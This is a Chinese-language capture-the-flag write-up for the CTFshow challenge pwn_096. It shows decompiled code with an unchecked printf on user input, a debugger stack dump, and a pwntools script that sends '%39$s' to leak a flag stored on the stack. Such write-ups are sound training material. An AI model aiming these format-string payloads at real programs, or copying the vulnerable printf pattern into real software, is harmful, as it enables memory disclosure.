# CTFshow-pwn_096
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（leak）
## 解题思路
> 格式化字符串泄露栈上数据

仅开启 NX 且为部分 RELRO  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_096
[*] '/home/mrw/CTFshow/pwn_096'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
 
主函数伪代码如下  
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3[64]; // [esp+0h] [ebp-90h] BYREF
  char s[64]; // [esp+40h] [ebp-50h] BYREF
  FILE *stream; // [esp+80h] [ebp-10h]
  char *v6; // [esp+84h] [ebp-Ch]
  int *p_argc; // [esp+88h] [ebp-8h]

  p_argc = &argc;
  setvbuf(stdout, 0, 2, 0);
  v6 = v3;
  memset(s, 0, sizeof(s));
  memset(s, 0, sizeof(s));
  puts(
    "    鈻勨杽鈻勨杽   鈻勨杽鈻勨杽鈻勨杽鈻勨杽  鈻勨杽鈻勨杽鈻勨杽鈻勨杽            鈻勨杽                           ");
  puts(asc_80488A4);
  puts(
    " 鈻堚枅鈻€          鈻堚枅     鈻堚枅        鈻勨杽鈻堚枅鈻堚枅鈻堚杽  鈻堚枅鈻勨枅鈻堚枅鈻堚杽   鈻勨枅鈻堚枅鈻堚杽  鈻堚枅      鈻堚枅");
  puts(asc_80489AC);
  puts(asc_8048A3C);
  puts(asc_8048AC0);
  puts(
    "    鈻€鈻€鈻€鈻€      鈻€鈻€     鈻€鈻€         鈻€鈻€鈻€鈻€鈻€鈻€   鈻€鈻€    鈻€鈻€    鈻€鈻€鈻€鈻€     鈻€鈻€  鈻€鈻€  ");
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Format_String                                           ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Flag on the stack!                                      ");
  puts("    * *************************************                           ");
  puts("It's time to learn about format strings!");
  puts("Where is the flag?");
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(v3, 64, stream);
  while ( 1 )
  {
    printf("$ ");
    fgets(s, 64, stdin);
    printf(s);
  }
}
```
- printf 的 format 字符串中若出现多余的格式符将会自动把栈上的数据作为格式符参数  
- 程序读取了 flag 并存储在栈上， gdb 调试界面如下所示，可知 flag 存放处位于第6个参数处，但 flag 地址的存放处却位于第0x27个参数处  
- 直接构建 "%39$s" 即可输出 flag  
```text
pwndbg> telescope 50
00:0000│ esp 0xffb7d050 —▸ 0xffb7d0a8 ◂— '114514\n'
01:0004│-0a4 0xffb7d054 ◂— 0x40 /* '@' */
02:0008│-0a0 0xffb7d058 —▸ 0xedf0a5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
03:000c│-09c 0xffb7d05c ◂— 0
04:0010│-098 0xffb7d060 ◂— 0
05:0014│-094 0xffb7d064 ◂— 0xf63d4e2e
06:0018│-090 0xffb7d068 ◂— 'flag{Success!}\n'
07:001c│-08c 0xffb7d06c ◂— '{Success!}\n'
08:0020│-088 0xffb7d070 ◂— 'cess!}\n'
09:0024│-084 0xffb7d074 ◂— 0xa7d21 /* '!}\n' */
0a:0028│-080 0xffb7d078 —▸ 0x804822c ◂— push ebx /* 'S' */
0b:002c│-07c 0xffb7d07c —▸ 0xffb7d0e4 ◂— 0
0c:0030│-078 0xffb7d080 —▸ 0xedf66b8c —▸ 0xedf276f0 —▸ 0xedf66a20 ◂— 0
0d:0034│-074 0xffb7d084 ◂— 1
0e:0038│-070 0xffb7d088 —▸ 0xedf27720 —▸ 0x804830b ◂— inc edi /* 'GLIBC_2.0' */
0f:003c│-06c 0xffb7d08c ◂— 1
10:0040│-068 0xffb7d090 ◂— 0
11:0044│-064 0xffb7d094 ◂— 1
12:0048│-060 0xffb7d098 —▸ 0xedf66a20 ◂— 0
13:004c│-05c 0xffb7d09c ◂— 0
14:0050│-058 0xffb7d0a0 ◂— 0
15:0054│-054 0xffb7d0a4 —▸ 0xffb7d35b ◂— 0x9b53ec9
16:0058│ eax 0xffb7d0a8 ◂— '114514\n'
17:005c│-04c 0xffb7d0ac ◂— 0xa3431 /* '14\n' */
18:0060│-048 0xffb7d0b0 ◂— 0
... ↓        13 skipped
26:0098│-010 0xffb7d0e8 —▸ 0x82941a0 ◂— 0xfbad2488
27:009c│-00c 0xffb7d0ec —▸ 0xffb7d068 ◂— 'flag{Success!}\n'
28:00a0│-008 0xffb7d0f0 —▸ 0xffb7d110 ◂— 1
29:00a4│-004 0xffb7d0f4 —▸ 0xedf09e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x22fd2c
2a:00a8│ ebp 0xffb7d0f8 ◂— 0
2b:00ac│+004 0xffb7d0fc —▸ 0xedcfecb9 (__libc_start_call_main+121) ◂— add esp, 0x10
2c:00b0│+008 0xffb7d100 ◂— 0
2d:00b4│+00c 0xffb7d104 ◂— 0
2e:00b8│+010 0xffb7d108 —▸ 0xedd1813d (__new_exitfn+13) ◂— add ebx, 0x1f1cf7
2f:00bc│+014 0xffb7d10c —▸ 0xedcfecb9 (__libc_start_call_main+121) ◂— add esp, 0x10
30:00c0│+018 0xffb7d110 ◂— 1
31:00c4│+01c 0xffb7d114 —▸ 0xffb7d1c4 —▸ 0xffb7e1ed ◂— './pwn_096'

```
**exp如下**
```python
from pwn import *
p = process('./pwn_096')
# gdb.attach(p)
p.sendline(b'%39$s')
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_096.py
[+] Starting local process './pwn_096': pid 26562
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Flag on the stack!                                      
    * *************************************                           
It's time to learn about format strings!
Where is the flag?
$ flag{Success!}

$ $  

```
